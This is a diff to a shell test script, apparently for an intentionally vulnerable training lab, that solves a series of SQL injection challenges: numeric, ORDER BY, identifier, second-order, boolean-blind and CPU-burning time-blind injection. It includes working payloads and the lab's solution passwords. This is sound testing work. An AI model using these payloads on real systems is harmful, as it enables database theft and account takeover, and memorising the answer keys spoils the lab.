@@ -1907,6 +1907,226 @@ body=$(page "$BASE/v/upload/tar_symlink/")
 expect_has "受保护的那份说明确实被写掉了" "TAR-SYMLINK-ESCAPED" "$body"
 rm -f /tmp/v4a-tar-build.py /tmp/v4a-ok.tar /tmp/v4a-evil.tar /tmp/v4a-notatar.tar
 
+step "17. SQLi 系列：注入点在哪儿（数字型 / ORDER BY / 标识符）"
+
+# ---- sqli/numeric_injection：数字型，不需要引号
+expect_unsolved "sqli/numeric_injection" "动手之前 check() 说未通关"
+
+curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/sqli/numeric_injection/login" \
+  --data-urlencode "user=alice" --data-urlencode "password=alice123"
+
+body=$(page -b "$JAR" -X POST "$BASE/v/sqli/numeric_injection/query" \
+  --data-urlencode "order_id=1")
+expect_has "正常查自己的单" "机械键盘" "$body"
+expect_unsolved "sqli/numeric_injection" "查自己的单不算"
+
+# 直接猜别人的 id —— 归属过滤写在 SQL 里，所以猜不到
+body=$(page -b "$JAR" -X POST "$BASE/v/sqli/numeric_injection/query" \
+  --data-urlencode "order_id=2")
+expect_no "直接猜别人的 id 猜不到（会走 IDOR，不是这一题）" "13900008888" "$body"
+expect_unsolved "sqli/numeric_injection" "猜 id 不算注入"
+
+# 算式：证明输入被当数字算了
+body=$(page -b "$JAR" -X POST "$BASE/v/sqli/numeric_injection/query" \
+  --data-urlencode "order_id=1-0")
+expect_has "输入被当成算式求值（1-0 等于 1）" "机械键盘" "$body"
+
+# 字符型的经典 payload 在这里没用 —— 这题的要点
+body=$(page -b "$JAR" -X POST "$BASE/v/sqli/numeric_injection/query" \
+  --data-urlencode "order_id=' OR 1=1 --")
+expect_has "字符型 payload 在这里只会弄坏语句" "OperationalError" "$body"
+
+# 数字型的 payload：一个引号都不需要
+body=$(page -b "$JAR" -X POST "$BASE/v/sqli/numeric_injection/query" \
+  --data-urlencode "order_id=2 OR 1=1")
+expect_has "数字型 payload 读出别人的单" "13900008888" "$body"
+expect_has "而且拼出的条件里能看到 AND 被 OR 短路了" "OR 1=1" "$body"
+expect_solved "sqli/numeric_injection" "check() 确认越过了归属过滤"
+rm -f "$JAR"
+
+# ---- sqli/order_by_injection：ORDER BY 处
+expect_unsolved "sqli/order_by_injection" "动手之前 check() 说未通关"
+
+body=$(page -X POST "$BASE/v/sqli/order_by_injection/list" --data-urlencode "sort=price")
+expect_has "正常按价格排" "机械键盘" "$body"
+expect_unsolved "sqli/order_by_injection" "按合法列排不算"
+
+body=$(page -X POST "$BASE/v/sqli/order_by_injection/list" \
+  --data-urlencode "sort=internal_grade")
+expect_has "按隐藏列名排被黑名单拦下" "命中了黑名单" "$body"
+
+body=$(page -X POST "$BASE/v/sqli/order_by_injection/list" --data-urlencode "sort=9")
+expect_has "列号越界的报错泄露了列数" "between 1 and 4" "$body"
+
+# 绕过一：用列号，不用列名
+body=$(page -X POST "$BASE/v/sqli/order_by_injection/list" --data-urlencode "sort=4")
+expect_has "按第 4 列（隐藏列）排出来了" "internal_grade" "$body"
+expect_solved "sqli/order_by_injection" "check() 确认行序泄露了隐藏列"
+
+# 绕过二：大小写（SQLite 的标识符不区分大小写）
+curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
+  --data-urlencode "id=sqli/order_by_injection" --data-urlencode "next=/"
+expect_unsolved "sqli/order_by_injection" "reset 之后回到未通关"
+body=$(page -X POST "$BASE/v/sqli/order_by_injection/list" \
+  --data-urlencode "sort=INTERNAL_GRADE")
+expect_has "大小写变体绕过了区分大小写的黑名单" "internal_grade" "$body"
+expect_solved "sqli/order_by_injection" "check() 确认大小写变体也算"
+
+# ---- sqli/identifier_injection：参数化管不到标识符
+expect_unsolved "sqli/identifier_injection" "动手之前 check() 说未通关"
+
+body=$(page -X POST "$BASE/v/sqli/identifier_injection/export" \
+  --data-urlencode "table=orders")
+expect_has "正常导出允许的表" "机械键盘" "$body"
+expect_unsolved "sqli/identifier_injection" "导出允许的表不算"
+
+body=$(page -X POST "$BASE/v/sqli/identifier_injection/export" \
+  --data-urlencode "table=users")
+expect_has "直接写 users 被黑名单拦下" "命中了黑名单" "$body"
+
+body=$(page -X POST "$BASE/v/sqli/identifier_injection/export" \
+  --data-urlencode "table=USERS")
+expect_has "大小写变体也被拦（黑名单做了归一）" "命中了黑名单" "$body"
+
+# 元数据表不在黑名单里 —— 免费的侦察通道
+body=$(page -X POST "$BASE/v/sqli/identifier_injection/export" \
+  --data-urlencode "table=sqlite_master")
+expect_has "sqlite_master 没被禁（能枚举表名）" "CREATE TABLE" "$body"
+expect_unsolved "sqli/identifier_injection" "只枚举结构还不算通关"
+
+body=$(page -X POST "$BASE/v/sqli/identifier_injection/export" \
+  --data-urlencode "table=pragma_table_info('users')")
+expect_has "pragma 表值函数能读到别人的列名" "password" "$body"
+
+# 绕过一：加 schema 限定
+body=$(page -X POST "$BASE/v/sqli/identifier_injection/export" \
+  --data-urlencode "table=main.users")
+expect_has "schema 限定绕过了整串比较" "DASH-OPS-4c81f2" "$body"
+expect_solved "sqli/identifier_injection" "check() 确认读到了 users 表"
+
+# 绕过二：换成子查询
+curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
+  --data-urlencode "id=sqli/identifier_injection" --data-urlencode "next=/"
+expect_unsolved "sqli/identifier_injection" "reset 之后回到未通关"
+body=$(page -X POST "$BASE/v/sqli/identifier_injection/export" \
+  --data-urlencode "table=(SELECT * FROM users)")
+expect_has "子查询同样绕过了整串比较" "DASH-OPS-4c81f2" "$body"
+expect_solved "sqli/identifier_injection" "check() 确认子查询也算"
+
+step "18. SQLi 系列：二次注入 / 布尔盲注 / 没有 SLEEP 的时间盲注"
+
+# ---- sqli/second_order：注入点是从库里读出来的用户名
+expect_unsolved "sqli/second_order" "动手之前 check() 说未通关"
+
+curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/sqli/second_order/register" \
+  --data-urlencode "username=bob" --data-urlencode "password=bob123"
+curl -s -o /dev/null -b "$JAR" -c "$JAR" -X POST "$BASE/v/sqli/second_order/login" \
+  --data-urlencode "username=bob" --data-urlencode "password=bob123"
+body=$(page -b "$JAR" -X POST "$BASE/v/sqli/second_order/password" \
+  --data-urlencode "new_password=whatever")
+expect_has "正常改自己的密码" "密码已更新" "$body"
+expect_unsolved "sqli/second_order" "改自己的密码不算"
+
+body=$(page -b "$JAR" "$BASE/v/sqli/second_order/")
+expect_has "页面记录了每一步拼出来的语句" "改密码" "$body"
+expect_has "而且能看出改密码那条里的用户名是拼进去的" "WHERE username = " "$body"
+rm -f "$JAR"
+
+# 二次注入：注册时用户名里带 payload（注册本身是参数化的，所以存得进去）
+curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/sqli/second_order/register" \
+  --data-urlencode "username=admin'--" --data-urlencode "password=attacker"
+body=$(page -b "$JAR" -c "$JAR" -X POST "$BASE/v/sqli/second_order/login" \
+  --data-urlencode "username=admin'--" --data-urlencode "password=attacker")
+expect_has "带 payload 的用户名能正常注册并登录（注册是参数化的）" "已登录" "$body"
+expect_unsolved "sqli/second_order" "光是登录还不算通关"
+
+body=$(page -b "$JAR" -X POST "$BASE/v/sqli/second_order/password" \
+  --data-urlencode "new_password=PWNED-BY-SECOND-ORDER")
+expect_has "改密码改掉的是 admin 那一行" "admin 的密码被改掉了" "$body"
+expect_solved "sqli/second_order" "check() 确认 admin 的密码变了"
+
+body=$(page -b "$JAR" -X POST "$BASE/v/sqli/second_order/login" \
+  --data-urlencode "username=admin" --data-urlencode "password=PWNED-BY-SECOND-ORDER")
+expect_has "而且真的能用 admin + 新密码登进去" "已登录：admin" "$body"
+rm -f "$JAR"
+
+# ---- sqli/boolean_blind：只剩一个布尔值
+expect_unsolved "sqli/boolean_blind" "动手之前 check() 说未通关"
+
+body=$(page -X POST "$BASE/v/sqli/boolean_blind/check" \
+  --data-urlencode "code=WELCOME10")
+expect_has "真的券码回「有效」" "这个券有效" "$body"
+
+body=$(page -X POST "$BASE/v/sqli/boolean_blind/check" \
+  --data-urlencode "code=NOPE")
+expect_has "假券码回「无效」" "无效的券码" "$body"
+expect_unsolved "sqli/boolean_blind" "只会试真假不算通关"
+
+# 信道：一个"无效"的输入，靠注入把条件改成真
+body=$(page -X POST "$BASE/v/sqli/boolean_blind/check" \
+  --data-urlencode "code=' OR 1=1 -- ")
+expect_has "布尔信道建立：注入让页面回了「有效」" "这个券有效" "$body"
+
+# 用布尔信道问一位（真、假各问一次，证明它是一个开关）
+body=$(page -X POST "$BASE/v/sqli/boolean_blind/check" \
+  --data-urlencode "code=' OR (SELECT 1 FROM users WHERE username='admin' AND substr(password,1,1)='v') -- ")
+expect_has "猜对了那位字符 → 「有效」" "这个券有效" "$body"
+body=$(page -X POST "$BASE/v/sqli/boolean_blind/check" \
+  --data-urlencode "code=' OR (SELECT 1 FROM users WHERE username='admin' AND substr(password,1,1)='z') -- ")
+expect_has "猜错了 → 「无效」（真假可区分）" "无效的券码" "$body"
+expect_unsolved "sqli/boolean_blind" "信道通了但还没把密码取出来"
+
+# 二分：用 > 代替 =
+body=$(page -X POST "$BASE/v/sqli/boolean_blind/check" \
+  --data-urlencode "code=' OR (SELECT substr(password,1,1) FROM users WHERE username='admin') > 'm' -- ")
+expect_has "二分：第一位 v 比 m 大 → 「有效」" "这个券有效" "$body"
+
+curl -s -o /dev/null -X POST "$BASE/v/sqli/boolean_blind/check" \
+  --data-urlencode "guess=wrong1"
+expect_unsolved "sqli/boolean_blind" "猜错密码不算"
+
+curl -s -o /dev/null -X POST "$BASE/v/sqli/boolean_blind/check" \
+  --data-urlencode "guess=v9k2mq"
+expect_solved "sqli/boolean_blind" "check() 确认两个目标都达成"
+
+# ---- sqli/sleepless_time_blind：数据库没有 SLEEP，自己造延迟
+expect_unsolved "sqli/sleepless_time_blind" "动手之前 check() 说未通关"
+
+t_normal=$(curl -s -o /dev/null -w '%{time_total}' -X POST \
+  "$BASE/v/sqli/sleepless_time_blind/" --data-urlencode "ticket_no=T-1001")
+expect_lt "普通查询很快返回" "$t_normal" "1.0"
+
+# 递归 CTE 当 CPU 燃烧器（Sqlite 没有 SLEEP）。数字是校准过的：
+# 600 万次约 0.7 秒，所以 2500 万次约 3 秒。
+SPIN="SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x < 25000000) SELECT x FROM c)"
+t_slow=$(curl -s -o /dev/null -w '%{time_total}' -X POST \
+  "$BASE/v/sqli/sleepless_time_blind/" \
+  --data-urlencode "ticket_no=' OR ($SPIN) -- ")
+expect_ge "递归 CTE 造出了可测量的延迟" "$t_slow" "2.0"
+
+# 条件式：证明它是一个真正的开关（真慢假快），不是单纯在拖时间
+t_true=$(curl -s -o /dev/null -w '%{time_total}' -X POST \
+  "$BASE/v/sqli/sleepless_time_blind/" \
+  --data-urlencode "ticket_no=' OR CASE WHEN (SELECT substr(password,1,1) FROM users WHERE username='admin')='q' THEN ($SPIN) ELSE 0 END -- ")
+t_false=$(curl -s -o /dev/null -w '%{time_total}' -X POST \
+  "$BASE/v/sqli/sleepless_time_blind/" \
+  --data-urlencode "ticket_no=' OR CASE WHEN (SELECT substr(password,1,1) FROM users WHERE username='admin')='z' THEN ($SPIN) ELSE 0 END -- ")
+expect_ge "条件为真时慢（猜对）" "$t_true" "2.0"
+expect_lt "条件为假时快（猜错）—— 所以它是个开关" "$t_false" "1.0"
+
+body=$(page -X POST "$BASE/v/sqli/sleepless_time_blind/" \
+  --data-urlencode "ticket_no=' OR ($SPIN) -- ")
+expect_has "页面本身永远说同一句话" "查询完成" "$body"
+expect_unsolved "sqli/sleepless_time_blind" "建立了信道还没提交密码"
+
+curl -s -o /dev/null -X POST "$BASE/v/sqli/sleepless_time_blind/" \
+  --data-urlencode "guess=wrong1"
+expect_unsolved "sqli/sleepless_time_blind" "猜错密码不算"
+
+curl -s -o /dev/null -X POST "$BASE/v/sqli/sleepless_time_blind/" \
+  --data-urlencode "guess=q7m4xd"
+expect_solved "sqli/sleepless_time_blind" "check() 确认两个目标都达成"
+
 step "结果"
 printf '  通过 %d 项，失败 %d 项\n' "$PASS" "$FAIL"
 if [ "$FAIL" != "0" ]; then
